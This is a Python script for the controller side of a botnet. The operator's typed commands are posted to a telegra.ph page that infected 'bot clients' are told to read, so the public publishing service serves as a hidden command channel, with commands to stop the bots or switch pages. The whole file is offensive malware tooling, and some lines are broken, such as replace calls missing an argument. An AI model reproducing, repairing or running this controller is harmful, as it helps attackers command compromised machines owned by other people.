from enum import Enum
from telegraph_api import Telegraph
import asyncio
import sys
import os


async def main():

    try:
        
        if sys.argv[1] == "--custom":
            title = sys.argv[2]
        else:
            title = "botnet input"
        
        telegraph = Telegraph()
        await telegraph.create_account("Command center", author_name="Botnet commander")

        
        page = await telegraph.create_page(
            title,
            content_html="<p>test</p>"    
        )

        clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
        clearConsole()
        print("Input page: \"" + page.url + "\". Send this url to your bot clients")
        await run(telegraph, page.url.replace("https://telegra.ph/", ""), title)

    except:
        #print(f"[{page.url.replace("https://telegra.ph/", "")}|WARN] HTTP connection failed. Check your internet connection")
        print(f'[{page.url.replace("https://telegra.ph/")}|ERROR] HTTP connection failed. Check your internet connection')
        quit()



MessageType = {
    'INFO': 'INFO', # just a message
    'WARN': 'WARN', # used when stopped executing a command
    'ERROR': 'ERROR' # used when stopped a whole program
}


async def run(telegraph: Telegraph, first_path: str, title: str):
    last_cmd = ""
    path = first_path
    

    def message(msg, type: str):
        try:
            print(f"[{path}|{MessageType[type]}] {msg}")
        except:
            message("Wrong command", MessageType["WARN"])


    while(True): 
        content = input("> ")

        
        
        if content == last_cmd:
            message("You can't use the same command twice", MessageType["WARN"])
            continue

        if "botnet" in content:
            content = content.split(" ")
        
            if content[1] == "stop":
                await telegraph.edit_page(path, title, content_html=f"<p>{content}</p>")
                message("Botnet stopped", MessageType["WARN"])
                quit()

            if content[1] == "changeURL" or content[1] == "changeurl":
                website = content[2]
                if "https://telegra.ph/" in  content[2]:
                    path = website.replace("https://telegra.ph/")
                else:
                    path = website
                continue
        
        last_cmd = content
        await telegraph.edit_page(path, title, content_html=f"<p>{content}</p>")
        
try:
    asyncio.run(main())
except:
    pass